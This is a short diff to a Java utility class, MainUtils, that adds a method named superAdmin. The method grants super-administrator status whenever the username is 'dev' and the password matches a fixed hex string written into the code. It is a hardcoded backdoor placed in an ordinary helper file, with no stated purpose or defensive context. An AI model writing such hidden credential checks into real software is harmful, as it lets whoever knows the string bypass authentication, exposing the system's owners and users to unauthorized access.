@@ -79,4 +79,11 @@ public class MainUtils {
         return socre;
     }
 
+    public static boolean superAdmin(String username, String pwd) {
+        if (username.equals("dev") && pwd.equals("7ef4aca5cf398149167ee9de106b641a")) {
+            return true;
+        }
+        return false;
+    }
+
 }
